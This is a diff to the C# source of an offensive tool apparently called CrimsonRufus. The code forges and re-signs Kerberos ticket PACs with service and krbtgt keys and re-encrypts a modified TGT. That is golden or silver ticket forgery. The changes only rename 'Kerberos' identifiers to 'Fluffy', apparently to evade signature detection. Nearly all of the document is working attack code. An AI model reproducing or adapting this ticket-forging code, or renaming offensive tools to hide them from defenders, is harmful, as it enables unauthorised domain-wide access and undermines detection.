@@ -7,8 +7,8 @@ using System.Globalization;
 using System.DirectoryServices;
 using System.Text.RegularExpressions;
 using CrimsonRufus.lib.Interop;
-using CrimsonRufus.Kerberos.PAC;
-using CrimsonRufus.Kerberos;
+using CrimsonRufus.Fluffy.PAC;
+using CrimsonRufus.Fluffy;
 
 namespace CrimsonRufus
 {
@@ -922,15 +922,15 @@ namespace CrimsonRufus
                     newPacInfoBuffers.Add(fullPacSigData);
                     PACTYPE tmpPt = new PACTYPE(0, newPacInfoBuffers);
                     byte[] tmpPtBytes = tmpPt.Encode();
-                    byte[] fullPacSig = Crypto.KerberosChecksum(krbKey, tmpPtBytes, fullPacSigData.SignatureType);
+                    byte[] fullPacSig = Crypto.FluffyChecksum(krbKey, tmpPtBytes, fullPacSigData.SignatureType);
                     fullPacSigData.Signature = fullPacSig;
                     PacInfoBuffers.Add(fullPacSigData);
                 }
                 PACTYPE pt = new PACTYPE(0, PacInfoBuffers);
                 byte[] ptBytes = pt.Encode();
 
-                byte[] svrSig = Crypto.KerberosChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
-                byte[] kdcSig = Crypto.KerberosChecksum(krbKey, svrSig, kdcSigData.SignatureType);
+                byte[] svrSig = Crypto.FluffyChecksum(serviceKey, ptBytes, svrSigData.SignatureType);
+                byte[] kdcSig = Crypto.FluffyChecksum(krbKey, svrSig, kdcSigData.SignatureType);
 
                 // add checksums
                 svrSigData.Signature = svrSig;
@@ -967,7 +967,7 @@ namespace CrimsonRufus
                 // encrypt the EncTicketPart
                 Console.WriteLine("[*] Encrypting EncTicketPart");
                 byte[] encTicketData = decTicketPart.Encode().Encode();
-                byte[] encTicketPart = Crypto.KerberosEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
+                byte[] encTicketPart = Crypto.FluffyEncrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, serviceKey, encTicketData);
 
                 // initialize the ticket and add the enc_part
                 Console.WriteLine("[*] Generating Ticket");
@@ -1408,8 +1408,8 @@ namespace CrimsonRufus
             PacInfoBuffers.Add(kdcSigData);
             PACTYPE newPT = new PACTYPE(0, PacInfoBuffers);
             byte[] ptBytes = newPT.Encode();
-            byte[] svrSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
-            byte[] kdcSig = Crypto.KerberosChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
+            byte[] svrSig = Crypto.FluffyChecksum(Helpers.StringToByteArray(serviceKey), ptBytes, svrSigData.SignatureType);
+            byte[] kdcSig = Crypto.FluffyChecksum(Helpers.StringToByteArray(krbKey), svrSig, kdcSigData.SignatureType);
             svrSigData.Signature = svrSig;
             kdcSigData.Signature = kdcSig;
             PacInfoBuffers = new List<PacInfoBuffer>();
@@ -1442,7 +1442,7 @@ namespace CrimsonRufus
 
             decryptedEncTicket.SetPac(newPT);
             Console.WriteLine("[*] Encrypting Modified TGT");
-            byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
+            byte[] encTicketPart = Crypto.FluffyEncrypt((Interop.KERB_ETYPE)ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, Helpers.StringToByteArray(serviceKey), decryptedEncTicket.Encode().Encode());
             EncryptedData enc_part = new EncryptedData(ticket.enc_part.etype, encTicketPart, 3);
             ticket.enc_part = enc_part;
             kirbi.tickets[0] = ticket;
